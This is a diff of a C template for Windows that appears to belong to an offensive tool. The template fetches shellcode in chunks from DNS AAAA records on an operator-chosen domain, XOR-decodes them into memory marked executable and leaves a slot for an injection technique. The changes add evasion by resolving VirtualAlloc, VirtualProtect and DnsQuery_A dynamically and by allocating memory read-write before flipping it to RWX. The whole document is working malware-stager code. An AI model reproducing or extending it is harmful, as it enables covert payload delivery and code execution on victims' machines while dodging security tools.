@@ -1,9 +1,12 @@
-#include <stdint.h>
-#include <inttypes.h>
 #include <winsock2.h>
 #include <windns.h>
 #include <windows.h>
-#include <stdio.h>
+
+
+// Required Function definitions
+typedef LPVOID(WINAPI *VirtualAllocType)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef LPVOID(WINAPI *VirtualProtectType)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef DNS_STATUS(WINAPI *DnsQuery_A_Type)(PCSTR, WORD, DWORD, PVOID, PDNS_RECORD, PVOID);
 
 
 typedef struct in6_addr {
@@ -14,11 +17,7 @@ typedef struct in6_addr {
     uint32_t __s6_addr32[4];
 #endif
   } u;
-} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;
-
-typedef uint8_t u_int8_t;
-typedef uint16_t u_int16_t;
-typedef uint32_t u_int32_t;
+} IN6_ADDR;
 
 
 LPVOID *GetShellCodeAddress(){
@@ -26,27 +25,38 @@ LPVOID *GetShellCodeAddress(){
   IN6_ADDR Ipv6address;
   PDNS_RECORD results;
   DNS_STATUS resp;
-  int i;
-  i = 0;
-  int z;
-  int x;
-  z = 0;
+  int Prefix;
+  Prefix = 0;
+  int MemoryPart;
+  DWORD OldProtection;
+  int NextMemoryPart = 0;
+
+  // Load Kernel32.dll using LoadLibrary
+
+  HMODULE Kernel32Module = LoadLibrary("kernel32.dll");
+  HMODULE DNSModule = LoadLibrary("Dnsapi.dll");
+
+  // Redefine required functions
+  VirtualAllocType VA = (VirtualAllocType)GetProcAddress(Kernel32Module, "VirtualAlloc");
+  VirtualProtectType VP = (VirtualProtectType)GetProcAddress(Kernel32Module, "VirtualProtect");
+  DnsQuery_A_Type DNSA = (DnsQuery_A_Type)GetProcAddress(DNSModule, "DnsQuery_A");
+
 
   // Allocate Memory for our shellcode
-  LPVOID allbuffer2 = VirtualAlloc(NULL, 0x1500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-  // Save the original allocated memory for later use
-  void *original_allbuffer2 = allbuffer2;
+  LPVOID OriginalBuffer = VA(NULL, {SHELLCODESIZE}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
   // Pointer to the domain name for later use
   char *domain;
 
+  // Change Allocated memory region protection
+  VP(OriginalBuffer, {SHELLCODESIZE}, PAGE_EXECUTE_READWRITE, &OldProtection);
+
   while(TRUE){
     // Do some format string to write full domain with prefix and save the to domain
-    asprintf(&domain, "{PREFIX}%i.{DOMAIN}", i);
+    asprintf(&domain, "{PREFIX}%i.{DOMAIN}", Prefix);
 
     // Send IPV6 "AAAA" request to the domain
-    resp = DnsQuery_A(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
+    resp = DNSA(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
     if(resp != 0){
       // Important break in case the domain is not resolvable
       // Also Important to know the last domain to call for
@@ -60,29 +70,29 @@ LPVOID *GetShellCodeAddress(){
     LPVOID Ipv6Address = &results->Data.AAAA.Ip6Address;
 
     // Write the shellcode bytes from Ipv6Address to the memory
-    for (x = 0; x < 16 ; x++) {
+    for (MemoryPart = 0; MemoryPart < 16 ; MemoryPart++) {
 
         // Copy each byte from shellcode to TempByte after decoding it
         // In case there is no XOR encoding it will XOR to 0x00 which
-        char TempByte = *((char *)Ipv6Address + x) ^ {KEY};
+        char TempByte = *((char *)Ipv6Address + MemoryPart) ^ {KEY};
 
         // Copy the shellcode chunck to the previously allocated space.
-        memcpy(allbuffer2 + z, &TempByte, 1);
+        memcpy(OriginalBuffer + NextMemoryPart, &TempByte, 1);
 
         // Make sure to append to the next memory address inside the allocated space.
-        z++;
-
+        NextMemoryPart++;
 }
 
 // Increase domain prefix by 1 "Move to the other domain"
-i++;
+Prefix++;
 
 // Sleep based on user input
 sleep({SLEEPTIME});
+
 }
 
 // Return the final decoded shellcode pointer
-return allbuffer2;
+return OriginalBuffer;
 
 
 
@@ -91,7 +101,6 @@ return allbuffer2;
 int main(){
 
 // Get Shellcode Address
-
 LPVOID ShellcodeAddress = GetShellCodeAddress();
 
 // Write your injection technique here
